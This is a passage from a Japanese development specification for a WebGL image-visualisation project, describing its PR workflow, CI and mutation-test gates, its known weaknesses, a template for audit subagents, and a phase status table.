- **`n ≤ 512` の破れの標本依存は、ラダーでは静かに消える。** `G10_RECORDED` は `rows` を
  鍵にした表なので、別の標本を通すと `expected === undefined` → `record(…, null)` ＝
  **採点しない**（赤くならない）。2c-vii では直していない

#### **型 2 を探している最中に、型 5 を踏んだ**（記録）

2c-vii は初稿で「傾斜帯の帯が半分しか名指しされていない」「代償の数字が 3 桁小さい
（×1.0004 に対し実際は ×1.4035）」と書いた。**どちらも偽だった。**

- §0 の到達水準表は 2c-iv が**両側を実測して**記録している。片側しか挙げていないのは
  `lensScene.ts` のコード内コメントだけ
- `×1.0004` は**門が全開の領域**（`d=1.25/1.50`）についての別の主張である。傾斜帯の
  記録値は `×1.354`（`core/fit.ts`）で、2c-vii の 18,000F の実測 **×1.3536289** は
  それと 4 桁一致する。**別の領域の数字どうしを並べて「590 倍」と書いていた**

**規律を書いた PR の中で同じ型を踏む**という §7.10 冒頭の指摘が、
**その §7.10 を拡張する PR の中で再現した。** 機構は型 5 を止めない（あれは 2c-viii）。

#### この機構自身の弱点（正直に）

- **ラチェット（`EXPECTED_TOOTHED_BUDGETS = 6`）は「人が数字を上げれば通る」形である。**
  `teeth.mjs` の `observed` と同じ規律なので既存の運用とは整合するが、**型 1 の再演になりうる**。
  **機構を作ること自体が「作ったから安心」の装置になる**のが、この作品でいちばん警戒すべき失敗である
- **`--teeth` は `quick: true` で回すので 10 行が生成されない。**
  G11a / G11b / G9z の予算は**故障を足さないかぎり永久に検査外**である
- **`G9/deltaE` の歯は機体依存。** `nophase` が動かす量は HIGH で 3.17（予算の 1.06 倍）だが
  BALANCED では 1.38 で予算を超えない ── **4 コアの機体ではこの歯が抜ける**
- **「`L` を動かすと色が変わるか」しか見ない。** `L` が機構から導かれた数か、
  今日の床のまわりに引いた柵か（G12 の 0.2% は後者）は判定できない。そこは人が書くしかない

---

## 8. 開発の進め方

**1フェーズ = 1ブランチ = 1 PR。** `main` へ直接コミットしない。
ブランチ名は `phase-<番号><字>-<短い英語>`。

PR 本文には必ず:
(a) 到達判定と**その実測値**（「通った」ではなく数字）
(b) 予算を外した項目とその理由
(c) 新たに判明した罠
(d) 上がった／下がった到達水準

品質ゲート**7 点**（2a で `ladder`、2c-vi で `ladder:budgets` が増えた）: `npm test` 全緑（CI）/ `npm run build` 成功（CI）/
**`npm run teeth` 全噛み（CI）** / **`npm run ladder` 全行通過（ローカルの実 GPU）** /
**`npm run ladder:budgets`（歯の在る予算を数える）** / 実ブラウザ測定の数値を PR に貼る / コンソールエラーゼロ。
CI は **build → test → teeth** の順で走る（`privacy.test.ts` が `dist/` を読むため。
「dist が無いから skip」は「常に緑」という最悪の失敗モードなので、あちらは skip せず落ちる）。

**ラダーは当面ローカルのゲートである。** CI の runner には GPU が無く、測ることになるのは
SwiftShader なので、**そこに置いた ΔE00 ゲートは「緑だが中身が無い」の典型**になる
（実測: 同じページで峰が SwiftShader 133 / ANGLE Metal 129）。CI へ載せるのは
`--structural`（起動・自己検査・コンソール 0・CPU で決まるアンカーの厳密一致）だけで、
それも「runner で通ること」を 1 度実測した PR で足す（§7.9.3）。
**そして `npm run ladder:teeth` を、ラダーの行を足したフェーズでは必ず走らせる** ──
測る道具が何も見ていないことは、その道具の出力からは分からない。

**歯は PR 本文ではなく `scripts/teeth.mjs` の台帳に書く**（Phase 1c で変えた。§7.9）──
本文に書く運用では、次のフェーズがその確認を再実行できない。新しい歯を足したら台帳に 1 行足す。

ドキュメント PR は実装 PR と分ける（親の #22〜#24 と同じ運用）。この到達水準表の更新は
フェーズ完了後に単独の PR で行う —— そうすると「何が測れて何がまだか」の履歴が読める。

### **分けるが、積まない**（Phase 2c-viii で決めた）

**文書 PR の base は最初から `main` にする。** 実装ブランチに積んではいけない。

2c-vii までは文書 PR を実装 PR の上に積んでいた。2c-viii で**費用を 3 つとも踏んだ**:

1. **CI の `concurrency` に ref が無く、2 本目を push した瞬間に 1 本目の run が消えた。**
   `cancelled` は `gh pr checks` 上 `fail` と区別できないので、**`npm run teeth`（CI で
   17 分 38 秒）が丸ごと飛んだのに、テストが落ちたのと同じ顔をする** ── 「赤いが中身が無い」。
   履歴を見ると **2c-vii でも 2 本が cancelled のまま**だった。**分けるほど確実に踏む形**である。
   → 2c-viii で `pages-${{ github.ref }}` に直した（この 1 つは解消済み）
2. **squash マージが積んだ PR の diff を壊す。** squash は新しい SHA を作るので、
   文書ブランチが持つ実装コミットが `main` のそれと一致しない。#38 の変更ファイルが
   **1 個から 5 個に見えた**。`git rebase --onto origin/main <実装ブランチ> <文書ブランチ>` が要る
3. **`--delete-branch` の順序を間違えると文書 PR が CLOSED になる**（base を失うため）

**1 は直したが、2 と 3 は「積む」のをやめれば消える。** そして `SPEC.md` は実装ファイルと
1 バイトも重ならないので、**積む理由がそもそも無い**。

```
git checkout main && git pull
git checkout -b phase-<番号>-docs     # ← 実装ブランチからではなく main から切る
```

こうすると 2 本を独立に出して独立にマージでき、**順序を問わない**。
CI も並走する（`concurrency` を直したので互いを消さない）。
失うのは「文書 PR の diff に実装が見える」ことだけで、**文書 PR のレビューで見たいのは
`SPEC.md` だけ**なので、それは失って構わない。

#### 分ける／分けないの判断

**基準は「文書 PR 単体でレビューする意味があるか」**である。

- **分ける** ── 仕様書側に**独立した主張**が載るとき。2c-viii は到達水準表に 7 行足し、
  うち 6 行が「これまで真だと思っていたことが偽だった」だった。実装の差分に混ぜると、
  §8 が分割を導入したときの理由（「直ったのか隠れたのかが同じ差分に紛れる」）を再演する。
  もう 1 つ実務的な効果がある ── **文書 PR は実装 PR の CI が緑になった後に書ける**ので、
  `build` の実測（17 分 38 秒）のような**CI でしか出ない数字を本文に確定できる**
- **分けない** ── 実装が小さく、`SPEC` の変更が「数字を 1 つ更新する」程度のとき。
  分割そのものにも費用（PR 2 本・CI 2 回・rebase）が在るので、主張が無いなら払わない

役割分担: 数学コア・GPU シェーダ・統合レビューは Fable、各フェーズの実装は Opus のサブエージェント、
**バグ修正の前には必ず独立した監査サブエージェントが実測ベースのプランを出す**。

**監査は段取りに強く、物理で外す**（2b で判明し、2c-i が再確認した）。2c-i では 3 体を並列で回し、
待つあいだに自分でも器具で測った。監査が出した成果は大きい ── 位相が**閉軌道**であること
（周期 2000π）を代数で確定させ、`PEAK_MARGIN` の理由文が偽であることを暴き、
`COMPRESS_KNEE` に歯が無いことを許容幅の逆算で示した。**しかし 3 体とも
「HDR の測定がひとつ残らず位相 0 で行われている」には到達しなかった** ──
静的な読みからは「位相 0 の前提を疑う理由」が出てこないためである。
2b の fp16 の丸めモードと同じ形で、**物理は器具でしか決まらない。**
→ 運用は「監査を並列で投げ、待つあいだに自分で測る」。どちらか一方にしない。

**2c-iv でこの運用が効いた。5 体を並列で回し、待つあいだに自分でも約 39 万フレーム掃いた。**
今回は**監査が物理に到達した** ── `layout()` で包絡が消えること（§4.22 訂正 3）も、
候補 32 が標本 No.0 でしか足りないこと（訂正 2）も、監査が実測で見つけた。
2c-i との違いは**プロンプトで「必ず数値を出せ」「静的な読みだけの結論は却下する」と
明示的に要求し、測る道具立て（作業ツリーを触らずに `src/` を import して回す vitest 設定）まで
渡した**ことである。「監査は物理で外す」は監査の性質ではなく、**依頼の書き方の問題**だった部分がある。

同時に、**自分の測定にも同じ穴があった**: 私は「包絡は `dimLevel` について単調で、
隣接スロットの max は厳密値を下回らない」を 0/1000・0/1001 で確認したが、
**それは標本 No.0 1 枚での確認**だった。監査が標本を 4 種に増やして反例を出した。
→ **標本を 1 枚しか通さない測定は、「測った」と書く前に標本を増やす。**

**そして 2c-vi で、その反省を書いた 2c-iv 自身が同じ型を踏んでいたことが分かった**
（「門が全開なら厳密ゼロ」を `dimLevel` を偏って採って書いた・§4.22 訂正 4）。
**規律の文章では止まらない。** → §7.10 で型ごとの機構に置き換えた。

**2c-vii で、テンプレートが 3 体とも物理へ到達させた。そして 3 体が私の渡した前提を覆した。**
今回は「既知の指摘」を**検算対象として**列挙し、「前提ではない」と明記した ── その結果:

| 監査 | 到達したもの | 外したもの |
|---|---|---|
| A | 「帯を割らない」が**恒真**であることを代数と 120 万点で確定 ／ `layout()` の反例 14/1001 ／ **刻み演算子が効かない**ことを 19 本の実走で | 前セッションの「−21.4%」を再現できず（私の実測も最大 −8.5%） |
| B | **引用された 3 標本が repo に無い**こと ／ `bootTier()` が ULTRA を返せない ／ G1 の `378/236` 直書き | 散りの倍率（repo に無い標本の値だった） |
| C | **名指しした 6 件のうち刻みの掃引は 0 件**という指摘 ／ 規準 (iv) の追加 ／「16 倍でも踏み損ねる」が偽 | 「`weaker` は欠陥」── §7.9 冒頭が意図と明記している |

**3 体が私の前提を 3 つ偽と判定した**（`--density` の設計・G10 の帯・費用の置き場所）。
「他人の指摘を鵜呑みにするな」の 1 行が、依頼文の中でいちばん働いている。

**そして 2c-vii は、監査を並列で投げて待つあいだに自分でも測ったことで救われた** ──
`d = 1.75 / 2.25` の後退も、包絡が 21 スロット中 2 つで超えられることも、
`n ≤ 512` の標本依存も、私が独立に測って持っていた。監査の枠組みの中だけで
考えていたら、`--density` をそのまま作っていた。

**2c-viii でもテンプレートは 3 体とも物理へ到達させた。** そして今回いちばん重い発見は
**実演**だった ── 監査 C は「主張を弱めながら緑のまま通る」経路を、実物の `teeth.mjs` を
mirror で端から端まで走らせて示した（`npm test` 緑・`teeth` EXIT=0・歯が 4 → 3）。
**静的な読みでは「`weaker` は exitCode を立てない」までしか出ず、それは 2c-vii が
「意図として明記されている」と却下した指摘と同じ文である。** 差は、
2c-vii の監査が**制御フローを読んだ**のに対し、2c-viii の監査が**代償を走らせた**ことにある。
→ 依頼文に「**その欠陥が実際に何を通すかを実演せよ**」を足す価値がある。

#### **監査の出す数値も検算する**（2c-viii で踏んだ）

監査 C は点集合の要素数を「13 本 / 合計 70」と報告した。**同じ規則で数え直すと 85 で、
`survival` の `CASES` は「3」ではなく実際には 2 だった。** 結論（行数しか見ていないので
幅を縮める変異が通る）は正しく、**通る変異 4 本も再現した**ので報告の価値は変わらない。
しかし**台帳へ書く数は自分で数え直したものにした** ── 監査は物理へ到達するようになったが、
**到達したことと、持ち帰った数が正確であることは別**である。
§7.10 の型 3 が「数字だけが残って誰も検算できない」を問題にしている以上、
**監査の数字をそのまま台帳へ写すのは、その型を新しく作ることになる。**

### **この系列の終端条件**（Phase 2c-ix で決めた）

**2c-vi から 4 フェーズ連続で「前の機構は回避できる」を見つけて、機構を足している。**

| フェーズ | 足した機構 | 次のフェーズが見つけた穴 |
|---|---|---|
| 2c-vi | 型 1 `ladder:budgets` / 型 4 `survival.test.ts` | ラチェットは人が数字を上げれば通る（自分で書いた） |
| 2c-vii | 型 2 `widen.test.ts` / 型 3 `specimen.test.ts` | **行数しか見ない** ── 幅を縮める変異が 4 通り通る |
| 2c-viii | `teeth` のラチェット・複製検査・`failed < observed` | **`observed` の一括 0 化**と**本数を保った入れ替え**が通る |
| 2c-ix | 総和ラチェット・歯の名簿・doc 数の台帳 | （まだ知らない） |

**この列は同じコミットの中では閉じない。** 独立監査が 13 経路を実物で走らせ、
**7 本が全門を EXIT=0 で通った**（2c-ix）。決定的なのは
**`process.exit(1)` を `exit(0)` にする**経路である ── メッセージを表示したまま緑になる。
**門の判定そのものが編集対象である以上、repo 内のどんな数字も、
その数字を読むコードごと書き換えられる。**

置いた機構のラチェットは全部「人が数字を下げる／名前を消す」形であり、
それは**設計上そうしている** ── 正当なリファクタで数が減る道を塞ぐと、
機構そのものが作業を止める柵になる（2c-viii が `failed < observed` を警告から赤へ上げたとき、
「正当に減った場合の道は塞いでいない」と書いたのはこの理由である）。

#### **閉じる形は在る ── 権威をコミットの外へ出すこと**（監査が実演した）

同じ木（歯を弱めた `src` ＋ 下げた台帳）を 2 通りで回すと:

| 回し方 | 結果 | EXIT |
|---|---|---|
| **その PR 自身の台帳**で回す | 合計 2 / 噛んだ 2 / 弱った 0 | **0** |
| **前の版の台帳**（その PR が触れない版）で回す | 合計 2 / 噛んだ 1 / **弱った 1** | **1** |

これ 1 つで、通った 7 本のうち **5 本が同時に閉じる**（5 本とも「台帳か門の編集」だから）。
閉じないのは 2 本 ── 歯を足す形の近似複製（後退ではない）と、
**どの歯も測っていない被覆を狭める**形である。後者はラチェットの問題ではない:
**台帳が測っているのは「落ちたテストの件数」であって「何が被覆されているか」ではなく、
件数は冗長性で埋まる**ので、被覆が痩せても数字が動かない。

**2c-ix ではこれを実装しなかった。** 理由は 2 つで、どちらも書いておく:
CI の teeth が 17 分 38 秒なので走行が 2 倍になること、
**squash マージした履歴では「前の版」が一意に決まらない**こと（§8 の分割運用の副作用）。
→ **2c-x 以降の候補として記録する。** 選ばなかったのは、費用と履歴の形が理由であって、
「機構で閉じられない」からではない。

→ **そのうえで、いまの状態を明記する。**

> **後退の検出は査読で終端する。機構は差分に跡を残すためのものであって、
> 悪意ある著者を止めるものではない。**

機構が主張してよいのは「**この後退は差分に出る**」までであり、
「**この後退は起きない**」ではない。`EXPECTED_MUTATIONS` を 57 から 3 に下げることも、
`EXPECTED_IDS` から `linePoints` の行を消すことも、**いつでもできる。**
違うのは、それが `- '2c-vi / 描いていない線の点数を漏らす（キャッシュが観測面へ出る）'` という
**読める 1 行**として査読に出ることだけである。

**だからこの系列の次のフェーズは「また機構を足す」ではない。**
機構を足す価値が在るのは、**跡が残らない後退経路**が実演されたときに限る
（2c-ix の 2 件はどちらもそれだった ── `observed` の一括 0 化は 54 行の差分に見えるが
**意味の変化が数字の変化として見えず**、歯の入れ替えは**本数が動かない**）。
「回避できる」だけでは足りない ── §7.10 自身が
「**機構を作ること自体が『作ったから安心』の装置になる**」と警告している。

**2c-ix はこの規準を自分にも当てた。** 監査が実演した 7 本のうち、機構を足したのは
**跡が残らない 3 本だけ**である:

| 通った経路 | 跡が残るか | 2c-ix の扱い |
|---|---|---|
| `observed` を一括で 0 にする | **残らない**（数字が動くのに意味が動かない） | **塞いだ**（1 以上の整数 ＋ 総和 143） |
| 1 本消して 1 本足す | **残らない**（本数が 54 のまま） | **塞いだ**（歯の名簿） |
| 型注釈の `=>` で走査器が止まる | **残らない**（`EVENTS` が「無い」と同じ） | **塞いだ**（走査器を直した） |
| 総和を保って片方を下げる | 残る（2 行の差分） | 原資だけ消した（`observed` を実測へ締めた） |
| 名前を残して中身を入れ替える | 残る（`find`/`replace` の差分） | `file` を id へ入れた。同一ファイル内は**開いたまま** |
| ラチェットを自己導出にする / `exit(0)` | 残る（機構そのものの差分） | **開いたまま**（査読が終端する） |
| 台帳の外の掃引を狭める | 残る | `EVENTS` を台帳へ足した。**一般には開いたまま** |

### 監査の依頼文（テンプレート）

2c-i では 3 体とも物理に到達せず、2c-iv 以降は毎回到達している。**差は監査の能力ではなく依頼文だった。**
新しい監査を立てるときは、次を必ず書くこと:

1. **作業ツリーを 1 バイトも変更しないこと**（git 操作も禁止）。一時ファイルの置き場を指定する
2. **時間のかかるコマンドの禁止**（`npm run teeth` は 7〜8 分・作業ツリーを変異させる。
   `ladder` 系は固定ポートで衝突する）。ブラウザを使う監査は 1 体だけにし、ポートを分ける
3. **測る道具立てを渡す** ── scratchpad に `node_modules` のシンボリックリンクを張り、
   `defineConfig` を import しない素のオブジェクトを default export する vitest 設定を置き、
   `resolve.alias` で `@lens` → `<repo>/src`。**`src/` の実装そのものを import すること（写経しない）**
4. **「必ず数値を出せ」「静的な読みだけの結論は却下する」と明示する**
5. **数を要求する**（「いくつか在る」ではなく「N 本 / M 本中」）
6. **他人の指摘を鵜呑みにするなと書く**（前フェーズの監査の主張も、自分で検算させる）
7. **確かめられなかったことを正直に列挙させる** ── ここが空の報告は信用しない
8. **その欠陥が実際に何を通すかを実演させる**（2c-viii で足した。制御フローを読んだだけの
   指摘は意図の判定を外す）
9. **監査の出す数値も自分で検算する**（2c-viii で足した。**2c-viii 自身がこれを怠って
   SPEC に 2 件の誤りを入れた** ── §7.10 の「×1.354 は `layout()` で変わる」と「閾値 1.27」。
   どちらも監査の要約を写しただけで、`layout(778×778)` を 1 回通せば偽と分かるものだった）
10. **私が渡す前提のうち、どれが検算対象かを明示する**（2c-ix で足した。今回いちばん重い
    発見は「**私が SPEC に書いたと思っていた数が、SPEC に書かれていなかった**」である ──
    引き継ぎに「テスト doc の表は 12 でなく 13」と書いたが、SPEC には 12 も 48 も無かった。
    **自分が何を書いたかの記憶も検算の対象**である）



### フェーズ

| | 内容 | 状態 |
|---|---|---|
| **0** | 骨組みと測る道具（CI・CSP・移植・ベンチ・DEV フック） | ✅ [#1](https://github.com/ops324/dimension-lens/pull/1) |
| **1a-i** | 色と持ち上げの純粋パイプライン（node/vitest のみ） | ✅ [#6](https://github.com/ops324/dimension-lens/pull/6) |
| **1a-ii** | 取り込み（worker・**EXIF 向きの probe**・機能検出・正準バッファ常駐） | ✅ [#8](https://github.com/ops324/dimension-lens/pull/8) |
| **1a-iii** | 描画とラダー（engine/postfx/点群/板/回転/DEV フック・**G0〜G7**） | ✅ [#10](https://github.com/ops324/dimension-lens/pull/10) |
| **1b** | 潰し（列平均バッファ・`sampleWeight`・`[0,5]` 全域・平均色・**dimLevel > 2 のフレーミング**・**G8〜G11**） | ✅ [#12](https://github.com/ops324/dimension-lens/pull/12) |
| **1c** | 取り込みの頑健性と空状態（HEIC・**Orientation 1〜8 の検証（3 実装 × 8 値）**・40MP・Display P3・退化・`copy.ts` 全文・**歯の仕組み化**） | ✅ [#14](https://github.com/ops324/dimension-lens/pull/14) |
| **2a** | **G9 の決着と測定基盤**（位相と畳み込み・`npm run ladder` 49 行・**ラダー自身の歯**・`readbackHDR`・`glInfo`） | ✅ [#16](https://github.com/ops324/dimension-lens/pull/16) |
| **2b** | **光の質**（`blendProbe` で残差の機構を切り分け・**`d ≥ 3` の色を採点する G12**・`CompressPass` の配線と `uKnee` の実測・bloom 閾値の柵・**光過敏の配慮が偽だったのを直す**・ラダー 68 行） | ✅ [#20](https://github.com/ops324/dimension-lens/pull/20) |
| **2c-i** | **位相を流して測る**（`MEASURED_PEAK_ENVELOPE` が位相 0 の値だったことの実測・**G16** と故障 `nosweep`・圧縮の強度を `1/(1−knee)` の極限へ・`COMPRESS_KNEE` の独立した柵・ラダー 70 行） | ✅ [#22](https://github.com/ops324/dimension-lens/pull/22) |
| **2c-ii** | **構図を時間の関数でなくした**（位相包絡を先に計算・`core/framingEnvelope.ts`・包絡は `cloudWeight` で入れる・歯 47） | ✅ [#24](https://github.com/ops324/dimension-lens/pull/24) |
| **2c-iii** | **CI がどのティアでもアンカーを採点する**（ティア別の期待値表・`bootTier()` 自身を採点する行・故障 `wrongtier`・**ティアの `dpr`/`samples` 未配線の記録**） | ✅ [#26](https://github.com/ops324/dimension-lens/pull/26) |
| **2c-iv** | **包絡が消える経路と、帯を守っていたものの取り違え**（`layout()` で包絡が 0 に落ちて戻らない・「`framingHold` を外すと帯を出る」「極値はノルム最大の点」「隣接スロットの max は安全側」の 3 つが偽・傾斜帯の代償を両側で実測・歯 48） | ✅ [#28](https://github.com/ops324/dimension-lens/pull/28) |
| **2c-v** | **深度の前提を正直にする**（`additionDepth` → `modelledAdditionDepth`・G10 の掃引を折れ点の列挙へ・**`n ≤ 512` は破れていた**（`4 × rows`）ので未修正のまま記録・G12 を **0.2%** にし導出の算術を訂正・**その予算に初めて歯を付けた**・ラダー 72 行 / 歯 14） | ✅ [#30](https://github.com/ops324/dimension-lens/pull/30) |
| **2c-vi** | **偽の主張を規律ではなく機構で止める**（19 件を 5 つの型へ・型 1 `ladder:budgets`（歯の在る予算 **6/19**）と型 4 `survival.test.ts`（**3,960 セル**）を機械に・2c-iv の「門が全開なら厳密ゼロ」を訂正・歯 49 / ラダーの歯 14） | ✅ [#32](https://github.com/ops324/dimension-lens/pull/32) |
| **2c-vii** | **型 2・型 3 を機械に**（**`--density` は設計が実測で覆った** ── 刻みを 4 倍にしても名指しした 6 件のうち 0 件に当たらず、費用 10.7 倍で新規検出 0 本。採用したのは**軸を全域へ広げる**ほうで 1.8 倍・新規 3 本。掃引の国勢調査 **93 / 249 本**・標本の台帳 **6 枚**・恒真だった採点式 1 本と刻み依存の予算 1 本を書き換え・歯 **53**） | ✅ [#34](https://github.com/ops324/dimension-lens/pull/34) |
| **2c-viii** | **主張の後退を機構で止める**（**出所リントは実測で覆った** ── 締めると捕捉率が 0/20 になる。「49 件 / 44 行」は 210 通りの数え方で包含関係が **0 通り**。代わりに `teeth` のラチェット（**従来は皆無**）・複製検査・`failed < observed` を赤へ・`ladder:budgets` の**分母**のラチェット・**点集合の規模の台帳**。歯 **54** / vitest **432**） | ✅ [#37](https://github.com/ops324/dimension-lens/pull/37) |
| **2c-ix** | **doc の数を「関数と引数」で再現する台帳**（`docLedger.test.ts`。実装 doc **36 表** / テスト **13 表** / 合計 **49**、**7 表 87 セル**を採点し残り **44 表を理由つきで除外**。書かれていない前提を 4 件・doc 側の誤りを 3 セル捕まえた。あわせて **`teeth` の severe な穴 2 つ**を塞ぐ（`observed` の一括 0 化・本数を保ったままの歯の入れ替え）。**「×1.354 は `layout()` で変わる」「閾値 1.27」「三者三様」は 2c-viii が検算せずに書いた誤り**として訂正。歯 **57** / vitest **447**） | ✅ [#39](https://github.com/ops324/dimension-lens/pull/39) |
| 2c-x | **畳みの機構**（`effectiveLineCount` の格子 y 軸版。`n ≤ 512` を実際に守らせる。**GPU で段の連続性を先に測る** ── モデルで検証すると `x/x` になる） | |
| 2c-xi | **ラスタライザ**（**SwiftShader は `f16`（最近接）で Metal の `f16-rtz` とは別物**・G14 を依存/非依存に割り、非依存側（`selftest-exact` / `f16-vs-f32 = 1.0` 厳密 / 「通過するモデルがちょうど 1 つ」）を CI へ。**`ladder:budgets` を CI へ載せるかもここで決める** ── SwiftShader で `6 / 19` が再現するかは未実測） | |
| 2c-xii | **費用の実測**（§4.10 の「オーバードローは常時 11.6 × フレームバッファ」は過大 ── ただし**倍率は未確定**。監査の境界箱による上界は 4.86〜8.61 倍で、「約 10 倍過大」は**向きだけが独立に確認**された。フレームの **93% が JS**・Safari 手動測定） | |
| 2c-xiii? | 候補選抜の規則（`ENVELOPE_CANDIDATES` の不足は **6 標本中 2 枚**・wide 0.068% / row1 9.294%）・`d ≤ 1` の包絡が描いていないバッファを見ている（§4.22）・**`bootTier()` が ULTRA を返せない**（936 / 1,800 通りで独立に確認）・**予算と `fitGrid` の描画点数の不一致**（3,901 通り中 3,889 通りで予算に届かない。§7.10 で訂正した） | |
| 3 | 作品化（UI・読み出し・キーボード・OGP・モバイルシート） | |
| 4 | モードB 押し出す（+ auto-dist の純関数化） | |
| 5 | モードC 観測者の次元 | |
| 6 | 任意（RGBA→n=6・PNG 書き出し・動画） | |

**Phase 2 を 2a / 2b / 2c に割った（Phase 2a で判断）。** 1 つの PR に入れると
**bloom を触った PR の中で G9 も動く**ことになり、「直ったのか隠れたのか」が
同じ差分の中に紛れる ── bloom の閾値 `0.28` は `d = 0` の目標リニア輝度 **0.265546** の
**1.0544 倍**しかなく、閾値を下げれば測定点が bloom の内側に入る。
**順序が保証になっている**ので、割る価値はフェーズ表の見た目より大きい。

**2b はその順序を仕組みにした。** 定数を触る前に `bloom.test.ts` を書き、
そのために bloom の定数を `postfx.ts`（`vendor.test.ts` が sha256 で丸ごと固定している
移植ファイル）から `core/bloom.ts` へ出した ── あのままだと閾値を壊す変異が
**「移植ファイルが書き換わったこと」しか検出せず**、`scripts/teeth.mjs` の台帳が
「何を守っている歯か」を言えなくなる。`core/compress.ts` も同じ理由で新設した。

**「EXIF」が 1a-ii と 1c の両方に立っていたのを分けた。** 同じ語が 2 フェーズにあると
分担が曖昧になり、実際 1a-ii の設計案は「EXIF を自分で回す」を 1a-ii に持ち込もうとしていた
（§4.12 のとおり、それは Chrome で確実に壊れる）。いまの分担は:

- **1a-ii**: デコーダが向きを適用したかを **probe で観測する**。適用されている限り何もしない
- **1c**: Orientation 1〜8 すべての検証（**済**）と、`'not-applied'` を返す環境が
  実在したときの自前回転（**書かなかった**）

**1c は「測ってから書かないことにした」**。3 実装 × 8 値 = 24 セルすべてで
デコーダが適用済みだったので（§4.12）、書けば到達不能な分岐になる。
残る未測定は Gecko のみで、そこが `'not-applied'` を返したと**実測されたその PR で**書く。
